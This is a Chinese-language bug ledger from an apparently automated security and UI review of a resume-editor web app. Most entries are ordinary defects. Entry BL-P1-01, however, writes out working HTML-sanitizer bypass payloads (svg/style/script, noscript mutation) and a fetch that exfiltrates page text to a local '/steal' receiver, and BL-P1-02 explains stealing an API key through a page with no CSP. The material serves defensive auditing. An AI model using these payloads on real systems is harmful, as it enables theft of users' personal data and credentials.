# B 线九路审查·缺陷总账（2026-11-01 固化）

> 来源：动态工作流 `dwfrun-725601b1-743c-4698-b733-58e7899f5878`（简历工作台·UI 调研与漏洞审查修复），2026-11-01 15:59 用户取消，44 节点中 36 个已完成。九路审查路径全部产出；中断的 8 个节点属独立复核阶段。本文件由已完成节点记录逐条导出固化，防止工作流记录失访。导出脚本一次性生成，不手工编辑。

> 复核状态：17 项独立复核已完成，**全部 confirmed**；其中 4 项复核收窄了范围或修正了前提（下文在各组备注）。未复核条目不再补跑审查期复核，转为修复后独立验证（见设计文档）。

> 基线：发现与复核读码时 HEAD=bfb033d（复核员实测确认涉事代码在 7430f03..bfb033d 间无 diff 或行号兼容）。


## 审查路 1（节点 13096，5 条）

### BL-P1-01（severity: high）

- **位置**：render-safe.mjs:43（RAW_TEXT_TAGS）与 render-safe.mjs:287-293（raw-text 分支原样保留内容）；调用点 server.mjs:889（renderDoc 内唯一净化点）、server.mjs:899（spawn 冻结件 render.mjs，页面无 CSP）
- **问题**：净化器的标签模型与浏览器 HTML 解析模型不一致：<svg> 里的 <style>/<textarea>/<title> 不是 raw-text、脚本开启时 <noscript> 才是 raw-text，净化器把这两处都判反了 → 未知 <script> 与 on* 事件属性原样通过净化，在无 CSP 的渲染 worker 里执行并把简历正文 POST 到外部服务器
- **证据**：净化器：render-safe.mjs:43 RAW_TEXT_TAGS 含 style/textarea/title、不含 noscript；render-safe.mjs:287-293 对 raw-text 元素把内容整段原样 push（不检查里面的标签）；:238 未识别 noscript → 按普通元素扫内容。浏览器：<svg> 是 foreign content，其 <style> 不切 raw-text（内容按标记解析）；脚本开启时 <noscript> 内容才是 raw-text。实测（真实 Chromium headless shell 1243 + 隔离数据根 + 随机端口 17881/17883）：(a) trustedRenderHtml('<svg><style><script>window.X=1</script></style></svg>') → removed: []，输出里 <script> 原样保留，setContent 后 window.X=1；(b) <svg><textarea><script>、<svg><title><script>、<svg><style><img src=x onerror=…> 同样 executed=1、removed=0；(c) '<noscript><p title="</noscript><img src=x onerror=…>">' → removed=0、executed=1（净化器把 </noscript><img…> 当成 <p> 的引号内属性值，浏览器却把它当真标签）。对照组：同一脚本放在普通 <script>、<svg><script>、<img onerror>、<iframe srcdoc> 下都被正确剥离（removed=unknown-script / event-attribute / embed-element）。端到端：把含 <svg><style><script> 的合成文档放进隔离 RESUME_ROOT，POST /render → 200，本地接收器收到 POST /steal，body=合成姓名+合成 11 位探针手机号（1×8 开头，不落字面量）+alice@example.com；<noscript> 变体同样收到合成姓名+secret 1×9 开头的合成探针号（不落字面量）。影响面：render.mjs 是冻结件、无 CSP，净化是唯一防线，而 handoff「可靠性收口轮」把 AUD-05 记为「未知 inline script、外链脚本、事件属性…全部剥离」——该合同实际不成立。附注：migrate-meta.mjs:187 直接 spawn render.mjs，同样绕过 trustedRenderHtml。
- **复现口径**：① 对 render-safe.mjs 直接单测：trustedRenderHtml(payload) 后用 playwright setContent，断言 window.X===1 且 removed 为空（payload 见 evidence 的 (a)/(c)）。② 端到端：隔离 RESUME_ROOT + 随机端口，起一个只收 POST 的本地接收器，写入含 <svg><style><script>fetch('http://127.0.0.1:PORT/steal',{method:'POST',body:document.body.innerText})</script></style></svg> 的合成文档，POST /render → 接收器应收到简历正文。脚本已留在 /tmp/probe-battery.mjs 与 /tmp/probe-exfil.mjs、/tmp/probe-exfil2.mjs。

### BL-P1-02（severity: high）

- **位置**：server.mjs:3413-3422（GET /snapshot/view）
- **问题**：该路由把冻结快照原文同源返回且不设任何 CSP 头 → 快照里的内联脚本在应用 origin 真实执行（可读 /settings 的明文 API Key 与全部简历正文），把 /edit 的 CSP 防护整条绕开
- **证据**：server.mjs:2336-2349 的注释写明「文档正文是外部输入（恢复的备份可带 <script>）→ 只放行已知的编辑器主脚本（sha256）与服务端注入块（nonce），其余内联脚本一律被挡」；server.mjs:4408-4411 又明确「/restore 不校验文档正文里的内联脚本…防护放在 /edit 的 CSP 上」——即恢复型恶意文档的防线被显式托付给 /edit 的 CSP，而 /snapshot/view 不在这道防线内。实测（隔离实例 + 真实 Chromium）：写一份含 <script>window.__PWN=1</script> 的合成文档 → POST /save 生成快照 → GET /edit?id=evil 响应头含 'Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-…\''，页面内 window.__PWN=null 且控制台报 CSP 违规；GET /snapshot/view?id=evil&ts=… 响应头无任何 content-security 行，页面内 window.__PWN=1（脚本真实执行）。后果：同源脚本可 fetch('/settings')（设置页 server.mjs:3805 把含 apiKey 的 profiles 内联进页面）取明文 Key，可 fetch('/api/extract?id=…') 取全部简历。注意：handoff 末章「剩余事项」已把「/snapshot/view 缺 CSP（高危，三路独立发现）」登记为 B 线待修，本轮复核确认当前 main@bfb033d 仍未修。
- **复现口径**：隔离实例 + 合成文档：写 docs/evil.html 含 <script>var DOC_ID='evil';</script> 与 <script>window.__PWN=1</script> → POST /save?id=evil → 用 playwright 打开 /snapshot/view?id=evil&ts=<快照ts>，断言 window.__PWN===1 且响应头无 CSP；同一文档开 /edit 断言 window.__PWN===null（对照组）。脚本见 /tmp/probe-csp-check.mjs。

### BL-P1-03（severity: high）

- **位置**：server.mjs:4332-4396（/restore 条目形状白名单）+ server.mjs:4259-4260（/backup 整目录打包）+ server.mjs:874-875 与 render-publish.mjs:193-196（.stage-/.new-/.bak- 命名）+ server.mjs:4058-4059（/restructure 临时名）+ server.mjs:797（saveSnapMeta 临时名）
- **问题**：渲染发布链与 /restructure、saveSnapMeta 在 docs//snapshots//pdfs/ 里留下的是非隐藏临时件，备份会原样打包；恢复侧的形状白名单只认固定形状，撞上任何临时件即整包 fail → 从此之后用户打出的每一个备份都无法恢复（预览与 apply 全拒），而 /backup 仍返回 200、下载正常、零提示
- **证据**：项目本来有「临时件不得进备份」的约定：tx.mjs:44 的 atomicWrite 用隐藏临时名（.<name>.<pid>.<ts>.tmp），server.mjs:4338 显式跳过隐藏条目；渲染发布链与另两处没遵守。实测三条（隔离 RESUME_ROOT + 随机端口 17872/17873）：(1) 真实触发路径——假渲染器模仿 render.mjs 的 tmp 命名（render.mjs:45 out+'.tmp-<pid>-<ts>'）并被 SIGKILL，渲染超时后 pdfs/ 留下 doc.pdf.stage-95073-<ts13>-feb2831a.tmp-95189-<ts13>，GET /backup 返回 200 且包内含该文件，POST /restore（raw body）→ {"ok":false,"error":"备份包含不允许的条目形状：pdfs/doc.pdf.stage-…"}，?apply=1&mode=merge 同样被拒；(2) 造 docs/doc.html.<ts13>-abc123.tmp（/restructure server.mjs:4058 的写法）→ 同样的整包拒绝；(3) 造 snapshots/doc/meta.json.tmp（saveSnapMeta server.mjs:796-797 的写法）→ 同样的整包拒绝。对照组：删掉残留后同一备份包预览返回 {"ok":true,…}。restore-guard.mjs 的注释自称恢复是「唯一能整体覆盖用户真实简历的路径，是数据安全网」——这条安全网会被一次渲染超时（server.mjs:908 的 60s 超时 + TERM→KILL 正是为超时准备的）静默关掉。
- **复现口径**：隔离实例：① 用假渲染器（写 out+'.tmp-<pid>-<ts>' 后忽略 SIGTERM）+ RESUME_TEST_RENDER_TIMEOUT_MS=800 → POST /render 返回 500 → ls pdfs/ 见 .stage-….tmp-… 残留 → GET /backup（200）→ POST /restore（--data-binary 传包体，不是 multipart）→ 返回「不允许的条目形状」。② 更省事：直接 touch 一个 pdfs/x.pdf.stage-1 文件后重复 ①②③。

### BL-P1-04（severity: medium）

- **位置**：server.mjs:996（readBody 默认 10MB）/ server.mjs:889（renderDoc 调 trustedRenderHtml 未传 maxHtmlBytes）/ render-safe.mjs:197（默认 4MB）/ server.mjs:2937（返回给前端的错误文案）
- **问题**：保存入口接受 ≤10MB 正文，渲染净化却在 4MB 硬拒 → 大文档能存能编辑却永远出不了 PDF/导出记录，且前端只看到「渲染失败（详见服务日志）」，用户无从判断原因
- **证据**：server.mjs:996 readBody 的 maxSize 默认 10*1024*1024，/save 的 HTML 路径与 JSON 协议路径都用它；renderDoc（server.mjs:889）调 trustedRenderHtml 时未传 maxHtmlBytes → 取 render-safe.mjs:197 的默认 4*1024*1024，超限按 render-safe.mjs:18 的契约「抛错（不静默截断，避免破坏版式）」直接失败。实测（隔离实例）：5MB 合成文档 POST /save → 200；POST /render → 500 {"ok":false,…,"error":"渲染失败（详见服务日志）"}；只有服务日志里有 '[render] 渲染输入净化失败：渲染输入超限: 5243031 字节 > 上限 4194304'。两个上限没有任何对齐或提示，页面侧无法诊断。
- **复现口径**：隔离实例：生成 >4MB 的合成 docs/x.html → POST /save?id=x（期望 200）→ POST /render?id=x（期望 500 且日志出现「渲染输入超限」）→ 断言整个流程没有任何面向用户的可诊断提示。

### BL-P1-05（severity: low）

- **位置**：chromium.mjs:106-116（resolveChromium 的等待分支）
- **问题**：并发探测时的等待方先读缓存、后看锁文件，与持锁方「先写缓存再放锁」的顺序之间有竞态窗口：缓存其实已可用，等待方却会 break 出循环并抛「另一个进程正在探测 Chromium，稍后重试」
- **证据**：chromium.mjs:119-129 持锁方是先 probe→写缓存（:123）→finally 里 releaseLock（:129）；等待方 chromium.mjs:110-114 每轮先 readCache()+cacheValid，再 existsSync(lockPath()) 判断是否 break。若持锁方恰好在等待方 readCache() 之后、existsSync() 之前完成写缓存并删锁，等待方会看到「锁没了但这轮缓存没读到」→ break → 落到 :115 throw。影响被 renderDoc 的一次重试（server.mjs:920）兜住，最坏是一次瞬时渲染失败（500）。说明：此条为代码阅读推断，本轮未稳定复现（竞态窗口极窄），未做注入复现。
- **复现口径**：需在 resolveChromium 的 readCache 与 existsSync 之间注入延迟（例如临时改源码或用 --require 钩子）并并发启动两个探测者；本轮未执行该注入，未复现。

## 审查路 2（节点 13097，6 条）

### BL-P2-01（severity: high）

- **位置**：job-panel.js:209（runInv 的 replace 分支）+ job-panel.js:245（applyChange 构造 inv）；同类问题见 job-panel.js:319（revertChange 的全局回退）
- **问题**：「同步撤回」用按文本首个匹配的 replace 反向回退，撤回的不是正向改动过的那一处；落账被服务端拒绝时正文被改乱，且 3 秒后的自动保存把改乱的正文写进磁盘。
- **证据**：正向 applyChange 返回 inv={kind:'replace', find:c.after, repl:c.before, opts:{root:anchor}}（job-panel.js:245）；逆向 runInv 调 window.__edReplaceText(c.after, c.before, {root:anchor})（job-panel.js:209）。editor-shell.js:500-534 的 __edReplaceText 用 stream.indexOf 取**首个**匹配，既不记录正向改动所在的位置、也不校验位置一致，因此候选新文案若在同段更早位置已出现，撤回就改到那一处。
实测（隔离实例 + 合成文档，/tmp/jp-probe/probeD.mjs，命令 `cd /tmp/jp-probe && node probeD.mjs`）：段落「负责维护与运维」，候选 before=「运维」/after=「维护」。
  接受前 页面/磁盘：「负责维护与运维」
  正向替换后：「负责维护与维护」→ 同步撤回（首个「维护」）→「负责运维与维护」← 原文被改乱
  服务端 400「origText 与当前正文锚点不匹配」→ 面板提示「（本次改动未落账，页面保持原样）」
  6 秒后（模板自动保存 3s，template.html:135）磁盘：「负责运维与维护」——改乱后的正文已落盘。
成功路径上合并会再次正向替换把文字「碰巧」还原（同理可证 S3），但失败路径（明确拒绝/结果未知的非落账分支）没有这一步，改乱的结果被自动保存固化。
- **复现口径**：造合成文档：`<p data-zid="z11111111">负责维护与运维</p>`，meta.job.changes 放一条 replace（zid=z11111111, before='运维', after='维护', status=pending）。先在页面里对该段追加一句自己的话（未保存，制造 origText 与磁盘不一致），再点该候选的「接受」→ 服务端 400 → 观察该段文字变成「负责运维与维护」，dirty 标记为 dirty，等 3~6 秒后读 docs/<id>.html，正文已是「负责运维与维护」。

### BL-P2-02（severity: high）

- **位置**：job-panel.js:687、721、772（runInv 的返回值被丢弃）+ job-panel.js:464-469（明确拒绝分支只提示、不校验也不回滚 DOM）
- **问题**：同步撤回失败（runInv 返回 false）无人察觉，未落账的候选文本留在正文里，3 秒后自动保存把它写进磁盘，而提示仍写「页面保持原样」。
- **证据**：runInv 的返回值在 job-panel.js:687（accept）、721（revert）、772（批量）三处都被丢弃；postSaveOps 的「明确拒绝」分支（job-panel.js:464-469）只 clearPending + note + refresh，既不回滚 DOM 也不核对正文是否真的回到提交前状态，而 note 的文案断言「页面保持原样」（job-panel.js:466）。
实测（/tmp/jp-probe/probeC.mjs，`cd /tmp/jp-probe && node probeC.mjs`）：两条候选落在同一锚点（z22222222）的批量接受：
  批量前 页面 P2 / 磁盘 P2：「第二段」/「第二段」
  批量后 页面 P2：「第二段改写一」；磁盘 P2：「第二段」（服务端整份拒绝）
  提示：「操作校验失败，整份拒绝（正文未保存）：origText 与当前正文锚点不匹配…（本次改动未落账，页面保持原样）」
  脏标记：dirty → 6 秒后（自动保存 3s）磁盘 P2：「第二段改写一」← 被服务端明确拒绝的候选文案进了磁盘。
根因：批量里第一条候选的撤回文本在第二条候选插入后已不存在，__edReplaceText 返回 false，撤回静默失败（job-panel.js:209）。这直接违反 handoff「落账确认前正文里不留本次改动」的既有合同。
- **复现口径**：造两条同锚点候选（zid 同为 z22222222，before 同为「第二段」，after 分别为「第二段改写一」「第二段改写二」），点「批量接受」→ 读提示（服务端整份拒绝）→ 读 .sheet 目标段文字（仍是被拒候选的文案）→ 等 3~6 秒自动保存 → 读 docs/<id>.html，候选文案已在磁盘上。

### BL-P2-03（severity: high）

- **位置**：job-panel.js:154-168（findEntry）、131-139（sectionByTitle）；使用点 258-264（hide）、265-293（reorder）、295-304（add）
- **问题**：hide/reorder/add 的落点用「章节名/条目标题的双向子串模糊匹配」定位，忽略服务端已经解析好的精确 zid → 隐藏/插入到错误条目并把错误结果写进磁盘，而候选状态却记在正确条目上。
- **证据**：sectionByTitle 用 txt.indexOf(needle)>=0 || needle.indexOf(txt)>=0 双向子串匹配取第一个命中（job-panel.js:137）；findEntry 同样用双向子串匹配条目标题（job-panel.js:159、165），并在段内找不到时退化到全文搜索。而服务端 anchorOf（server.mjs:486-499）对 hide 是按条目**文本**精确解析 zid（server.mjs:498），服务端根本不看 c.section——即客户端是 c.section 的唯一消费者，却用模糊匹配。
实测（/tmp/jp-probe/probeE.mjs，`cd /tmp/jp-probe && node probeE.mjs`）：合成文档含两个条目「某公司」(zid z11111111，工作经历) 与「某公司实习」(zid z33333333，项目经历)；hide 候选 {zid:'z33333333', section:'工作经历', entry:'某公司实习'}：
  接受前 页面隐藏项：空
  接受后 页面隐藏项：「z11111111|某公司后端工程师 , z11111112|负责支付网关」← 隐藏的是「某公司」，不是目标
  磁盘隐藏项 zid：z11111111（期望 z33333333）← 错误结果已落盘
  服务端候选状态：cH:accepted:zid=z33333333 ← 状态记在正确条目上，与磁盘内容不一致。
2026-10-24 那轮只给 replace 路径补了 zid 锚点（handoff「[高] 接受建议按全文首个匹配替换，忽略 change.zid 锚点」），hide/reorder/add 仍是标题匹配。
- **复现口径**：造合成文档：两个 section「工作经历」/「项目经历」，各有 entry-head「某公司」/「某公司实习」并带 data-zid；meta 放一条 hide 候选 {zid:'某公司实习的 zid', section:'工作经历', entry:'某公司实习'}；点「接受」→ 读 .sheet 里 .ed-entry-hidden 的 data-zid（是「某公司」的 zid）→ 读 docs/<id>.html（同一 zid 被隐藏）→ GET /job/changes 看状态记在哪个 zid 上。

### BL-P2-04（severity: medium）

- **位置**：job-panel.js:748（批量路径的 origText 在 applyChange 之后计算）对照 evidence.mjs:262（服务端按磁盘文本校验 origText）
- **问题**：同一段落上的多条候选（共享同一 zid）批量接受时必然整批 400：客户端按 DOM 当前状态算 origText，服务端按磁盘上的锚点文本校验，第二条起就对不上。
- **证据**：批量路径里 origText 取自 anchorEl.textContent（job-panel.js:748），而该锚点在同批前一条候选被 applyChange 改写后已经变了（job-panel.js:749 紧接其后执行）；服务端 applyOps 的锚点表由磁盘旧正文 parasOf 构建（evidence.mjs:233），对每条 op 都要求 anchor.text === normText(op.origText)（evidence.mjs:262），因此第 2 条起必然不匹配 → 整份 400。
而同一段落出现多条候选是常规场景：服务端按 before 文本解析锚点（server.mjs:482-499 的 byText），同一段里的两个不同片段会解析出**同一个 zid**。
实测（/tmp/jp-probe/probeB.mjs、probeC.mjs）：两条同锚点候选批量接受 → 服务端「操作校验失败，整份拒绝（正文未保存）：origText 与当前正文锚点不匹配（正文已被并发修改，请刷新后重试）」，两条候选状态都留在 pending，功能完全不可用。
- **复现口径**：同锚点两条候选（zid 相同、before 相同、after 不同）→ 点「批量接受」→ 读提示与服务端 GET /job/changes 的 changes[].status（两条都还是 pending）；对照：把两条候选拆开逐条点「接受」则都成功。

### BL-P2-05（severity: medium）

- **位置**：job-panel.js:666-672（确认门整段替换）与 job-panel.js:687（同步撤回的同款整段替换）；editor-shell.js:500-534（__edReplaceText 按文本节点切分）
- **问题**：needs-compare 确认门与同步撤回都用「整段 textContent 替换」回写段落，把行内标记（<b>/<em>）掏空成 <b></b>；落账被拒时格式同样已经丢失，并被自动保存落盘。
- **证据**：确认门路径用 window.__edReplaceText(preText, c.after, {root: anchorEl})（job-panel.js:670）——preText 是整段 textContent；__edReplaceText 把匹配区间切成多个文本节点逐个替换（editor-shell.js:520-530），段落里的 <b> 元素被保留但内容被清空。同步撤回用同款整段替换（job-panel.js:687 + 245），所以一次「应用→撤回」往返就把格式打掉了。
实测（/tmp/jp-probe/probeB.mjs 成功路径、`cd /tmp/jp-probe && node probeB.mjs`）：
  初始 P1 innerHTML：「负责 <b>核心模块</b> 的开发」
  确认门展示：「当前正文：负责 核心模块 的开发」（只有纯文本，用户无从得知加粗会丢）
  合并后 页面 P1 / 磁盘 P1：「负责核心模块与运维的日常开发<b></b>」← 强调标记被静默清除并落盘
失败路径（/tmp/jp-probe/probeH.mjs，服务端以「候选不在 pending」400 拒绝）：
  拒绝后 页面 P1 / 磁盘 P1：「负责 核心模块 的开发<b></b>」← 操作明确失败，格式仍被清掉并落盘，提示却说「页面保持原样」。
- **复现口径**：合成段落 `<p data-zid="z11111111">负责 <b>核心模块</b> 的开发</p>`；放一条 needs-compare 候选（baseSnapshot 与正文不同以触发确认门）→ 走确认门「确认接受」→ 读 .sheet 与 docs/<id>.html 的该段 innerHTML，<b> 已变空。失败版：把服务端 meta 里该候选 status 改成 rejected 后再点确认，400 拒绝后 innerHTML 仍是「负责 核心模块 的开发<b></b>」。

### BL-P2-06（severity: low）

- **位置**：job-panel.js:821-869（renderRejectChips 把 chips 插到条目 div 里）+ job-panel.js:1080-1088（restorePanelInputs：元素数量不一致就整体放弃回填）
- **问题**：拒绝原因 chips 是点击「跳过…」后才插入面板的，面板一旦重建（轮询/任意触发 render）元素数量就变了，A9 的在途输入回填整体放弃，用户已输入的原因被丢弃。
- **证据**：capturePanelInputs/restorePanelInputs（job-panel.js:1070-1088）以「回填前后输入元素数量相同」为前提，结构一变即 return，不做任何回填；而 renderRejectChips（job-panel.js:821-869）把 chips 与自定义原因输入框 append 到条目 div，render()（job-panel.js:1096 root.innerHTML=''）重建时它们根本不在新结构里。
实测（/tmp/jp-probe/probeG.mjs，`cd /tmp/jp-probe && node probeG.mjs`）：点「跳过…」打开 chips → 在自定义输入框输入「我自己写的原因」（读回确认已输入）→ 触发一次面板重建（点筛选按钮「仅重点」→ savePos()+render()）→ 「6s 后 chips 是否还在：不在（已消失）」，已输入的原因一并丢失。
- **复现口径**：打开 /edit?id=<岗位草稿>，点某候选的「跳过…」→ 在自定义原因输入框里打字 → 触发任意一次面板重建（生成任务运行中的 2.5s 轮询，或点一下筛选/分段按钮）→ chips 与已输入文字一起消失。

## 审查路 3（节点 13099，7 条）

### BL-P3-01（severity: medium）

- **位置**：ai-panel.js:483-490（$('ai-apply').onclick），配合 editor-shell.js:500-535（__edReplaceText 默认 chosen=0）
- **问题**：选区改写「应用」用 __edReplaceText(pendingBefore, pendingAfter) 且不传 occurrence/context，而 __edReplaceText 默认 chosen=0（全文首个匹配），于是用户选中的那一处可能被忽略、改写到正文里第一处同名文本上，且面板不给任何提示——与同文件聊天路径「多处命中即拒绝」的口径相反。
- **证据**：ai-panel.js:483-490 `$('ai-apply').onclick` → :486 `if (window.__edReplaceText(pendingBefore, pendingAfter)) ...`，未传 occurrence/context；editor-shell.js:510-511 `var chosen = 0;`（无 occurrence/context 时恒取全文首个匹配）。对照同一文件 ai-panel.js:275-277 聊天路径有显式多处命中拒绝（`'原文在正文里出现多处，无法确定改哪一处，已拒绝'`）——两条路径口径相反。真实浏览器+隔离实例实证（合成文档 P1/P2 文字完全相同）：`node /tmp/resume-probe/probe.mjs` 输出 `CASE2 应用后 P1 = "{}"` / `CASE2 应用后 P2 = "负责队列服务，把延迟从 80ms 降到 12ms"` / `CASE2 判定：改到了「第一处」同名文本 = false`、`改到了用户实际选中的第二处 = false`——即用户选第二段，第一段被改写，面板零提示。改写经 __edMarkProgrammatic 把文档置脏，下一次自动保存即落盘。
- **复现口径**：跑 /tmp/resume-probe/probe.mjs（隔离 RESUME_ROOT=mkdtemp + 随机端口 + 合成文档 + 假 LLM）：文档放两段同文 `<p data-zid=z11111111>` 与 `<p data-zid=z22222222>`；用 Range 选中第二段 → 点 #ed-seltb 的预设按钮 → #ai-gen → #ai-apply；读两段 textContent，第一段被替换即复现。

### BL-P3-02（severity: medium）

- **位置**：zone-panel.js:633-640（bindOne 的 api('/zones').then(load).catch）
- **问题**：改绑/确认请求的业务级失败（HTTP 400/409/5xx，或响应体 ok:false）完全不可见：api() 对任何 HTTP 状态都 resolve、从不 reject，A10 新加的 .catch 只覆盖网络异常，服务端拒绝被 .then(load) 静默吞掉，用户会以为改绑已生效。
- **证据**：zone-panel.js:69-77 `api()`：`r.json().catch(()=>({ok:false,error:'HTTP '+r.status})).then(d=>{d._status=r.status;return d;})` —— 对任何 HTTP 状态都 resolve，从不 reject；zone-panel.js:633 `api('/zones?id=...',{zones:next}).then(load).catch(...)` 的 catch 只在网络异常时触发；随后 `load()`（:113-122）在 `!d.ok` 时静默 return（:115）。实证：`node /tmp/resume-probe/probe.mjs` 用 page.route 把 POST /zones 拦成 400 `{ok:false,error:'非法条目 z33333333'}`，输出 `CASE1 /zones 400 请求已发出: yes`、`CASE1 面板错误提示 .zp-msg = ""`、`CASE1 面板内是否出现「未保存/失败/非法」字样: false`（请求确实到了服务端，界面零反馈）。A10 的注释写的目标（『改绑失败必须可见，否则用户误以为已成功』）在业务级失败上未达成。
- **复现口径**：隔离实例里 page.route('**/zones?id=*') fulfill 400 JSON {ok:false,error:'…'}，面板点「待确认分类」→ 选任一区域 → 观察 #zp-root 内无 .zp-msg、无失败字样。

### BL-P3-03（severity: medium）

- **位置**：zone-panel.js:621-632（bindOne 整表构造 next），配合 server.mjs:2700-2702（/zones 按条目替换）
- **问题**：bindOne 用 load() 时刻的 zones 快照整表回写，而服务端按条目整体替换（payload 未带 locked 即该条目的 locked 键消失），于是任何在面板加载之后才设置的锁定，都会被下一次与它无关的改绑静默抹掉——用户对某段的保护被无声解除。
- **证据**：zone-panel.js:621-632 用 `state.zones`（load() 于 :113-122 取的快照）整表构造 payload，逐条只带自己知道的 locked（:627/:631）；服务端 server.mjs:2700-2702 `zones[zid] = {zone,status,...(locked===true?{locked:true}:(locked===false?{locked:false}:{}))}` —— payload 未带 locked 时该条目的 locked 键直接消失（该函数自己的注释就写着『漏传会静默丢锁』）。实证：`node /tmp/resume-probe/probe2.mjs` 先外部 POST /zones 把 P3 锁上（磁盘 `{"zone":"work","status":"confirmed","locked":true}`），随后面板里只把无关的 P4 改绑到「工作」，磁盘变成 `{"zone":"work","status":"confirmed"}`，输出 `CASE4 P3 的 locked 是否被抹掉 = true`。注：当前前端无任何写 locked=true 的入口，触发需由第二个写者（POST /zones 是契约指定的唯一写入口）或外部工具设置；这是合同层面的实现缺陷而非理论问题。
- **复现口径**：隔离实例：外部 POST /zones 写 {zones:{…,P3:{zone:'work',status:'confirmed',locked:true}}}；在浏览器面板里改绑另一个 pending 段（触发 bindOne 整表回写）；读 RESUME_ROOT/docs-meta.json，看 P3.locked 是否还在。

### BL-P3-04（severity: medium）

- **位置**：zone-panel.js:326（rewrite 只派发 d.rewrites）与 zone-panel.js:460-479（mergeZoneReceipt 只消费 receipt.applied）
- **问题**：服务端为「因锁定/改绑/事实冲突被跳过」的候选专门返回 skipped 明细，客户端却整段丢弃：生成侧只取 d.rewrites、应用侧只遍历 receipt.applied，面板文案只报「已应用 N 段」；用户既不知道哪几段没被改，也看不到任何地方显示 locked 状态，于是「接受（2 段）」变成「已应用 1 段」而无任何原因。
- **证据**：服务端明确回 skipped：server.mjs:4146 `if (!free.length) return sendJson(200,{ok:true,rewrites:[],skipped:[...locked],...})`、:4163 `rewrites, skipped:[...locked]`；/save 的区域回执也带 skipped（server.mjs:2158 `applied: zoneResult.applied, skipped: zoneResult.skipped`）。客户端 zone-panel.js:326 只取 `d.rewrites || []`，:460 只遍历 `receipt.applied`，skipped 全部丢弃；:476-479 的文案只按 applied 计数。zone-panel.js 全文中 locked 只出现在 :622/:627/:631 的回写代码里，界面没有任何位置显示锁定状态。实证：`node /tmp/resume-probe/probe2.mjs` 输出 `CASE6 接受按钮文案 = "接受（2 段）"` → 生成与应用之间锁上 P3 → `CASE6 应用后面板文案 = "已应用 1 段"`、`CASE6 P3 正文 = "负责容量规划，支撑三年增长"`（未改）、`CASE6 面板是否提到「锁定/跳过」 = false`。
- **复现口径**：隔离实例：假 LLM 对同一区域返回 2 条候选 → 点「生成改写」→「接受（2 段）」；生成与应用之间把其中一段 locked=true（POST /zones）；点接受 → 面板只报「已应用 1 段」，无跳过说明。

### BL-P3-05（severity: medium）

- **位置**：ai-panel.js:487-488（$('ai-apply').onclick 的 else-if 链）
- **问题**：选区改写「应用」失败时错误提示被 else-if 链吃掉：__edPushUndo/__edDropUndo 在外壳里恒存在，所以失败一定走 __edDropUndo 分支，而唯一的『原文未找到…未应用』提示挂在最后的 else 上，永不执行——用户点「应用」后既无提示也无变化。
- **证据**：ai-panel.js:485-489：`var popOpId = window.__edPushUndo ? window.__edPushUndo('AI 改写') : null;` → :486 成功分支 → :487 `else if (popOpId != null && window.__edDropUndo) window.__edDropUndo(popOpId);` → :488 `else __status($('ai-preview'),'warn','原文未找到（可能已被修改），未应用');`。__edPushUndo/__edDropUndo 在 editor-shell.js:675/685 恒存在，故 :487 恒命中、:488 永不执行；失败路径还有 :488 之前的空 else-if 链（无 else 兜底）。实证：`node /tmp/resume-probe/probe.mjs` 生成预览后把原文改掉再点应用，输出 `CASE3 应用后预览区文本 = "负责容量规划，支撑三年增长{}"`、`CASE3 弹层仍显示 = block`（:486 成功才隐藏弹层，故确属失败路径）、`CASE3 出现「未找到/未应用」提示 = false`。
- **复现口径**：隔离实例：选区改写生成预览 → 生成后改掉正文里那段 → 点「应用」→ 观察 #ai-preview 无任何警告、弹层仍开着、无控制台报错。

### BL-P3-06（severity: low）

- **位置**：zone-panel.js:148（render 的 root.innerHTML = html）与 zone-panel.js:239-241（renderAi 重建空 #zp-preview）
- **问题**：已经生成好的改写候选会被下一次 render() 连同容器一起清空：render() 用 root.innerHTML = html 覆盖整个面板根，#zp-preview 容器与其中的候选卡片、「接受」按钮一并销毁，renderAi() 随后新建一个空的；而 analyze() 成功后必调 load() → render()，于是点「重新分析」或任何刷新都会让候选凭空消失。
- **证据**：zone-panel.js:148 `root.innerHTML = html;` 销毁 root 下全部子节点（含 #zp-ai 与 #zp-preview）；:239-241 renderAi() 中 `var prev = document.getElementById('zp-preview'); if (prev) … else { prev=document.createElement('div'); prev.id='zp-preview'; … }` —— 旧的已被销毁，只能新建空容器；:301 analyze() 成功后 `load();` → :119 `render();` 触发上述重绘。实证：`node /tmp/resume-probe/probe2.mjs` 输出 `CASE5 生成后接受按钮 = "接受（2 段）" 出现=true` → 点「重新分析」→ `CASE5 「重新分析」后 接受按钮还在 = false`、`CASE5 「重新分析」后 预览区文本 = ""`。JS 变量 preview 仍保留旧候选，与界面状态不一致。
- **复现口径**：隔离实例：区域 Tab 里生成改写候选（出现「接受（N 段）」）→ 点「重新分析」→ 候选卡片与接受按钮消失，预览区为空。

### BL-P3-07（severity: low）

- **位置**：zone-panel.js:186-196（degrade 插提示）与 zone-panel.js:197-200/245（renderAi 重建旧框被 remove）
- **问题**：「未配置大模型」的降级提示节点被插在 AI 框内，而 renderAi() 的 old.remove() 会连提示一起删除，state.aiDegraded 却仍为 true：重绘后只剩两个永久禁用的按钮和永远停在「分析中…」的输出区，用户既看不到原因也点不动。
- **证据**：zone-panel.js:186-196 degrade()：`note.className='zp-degr'; box.insertBefore(note, box.firstChild);`（提示挂进 AI 框）；:197-200 renderAi()：`var old = aiBox(); … if (old) old.remove();` —— 提示随旧框一起被删；:245 `setBusy(state.aiDegraded)` 保持按钮禁用，:187 `state.aiDegraded = true` 不复位；:213 `out.textContent = '分析中…'` 保持「分析中…」。实证：`node /tmp/resume-probe/probe3.mjs`（隔离实例不写 config.json → 服务端 409 LLM_NOT_CONFIGURED）输出 `CASE7 降级后 AI 框文本 = "未配置大模型，绑定/确认/锁定不受影响AI 意见 · 工作分析中…重新分析生成改写"` → 触发一次 ed-zone-refresh 重绘 → `CASE7 重绘后 AI 框文本 = "AI 意见 · 工作分析中…重新分析生成改写"`、`CASE7 重绘后 降级提示 .zp-degr 是否还在 = false`、`CASE7 重绘后 out 文本 = "分析中…"`、`CASE7 重绘后 按钮仍禁用 = true`。
- **复现口径**：隔离实例（不放 config.json）→ 区域 Tab 点任一区域行触发分析（服务端回 409 LLM_NOT_CONFIGURED → degrade）→ 切走再切回区域 Tab（外壳派发 ed-zone-refresh）→ 提示消失，只剩禁用的按钮与「分析中…」。

## 审查路 4（节点 13100，7 条）

### BL-P4-01（severity: medium）

- **位置**：eval.mjs:45-46（parseEvalReport 签名只接 docText）、eval.mjs:111-116（salary 回落分支）；消费点 server.mjs:1417-1419（evalCardHtml 薪资行）、server.mjs:2494（rec.jd 存了 JD 原文）
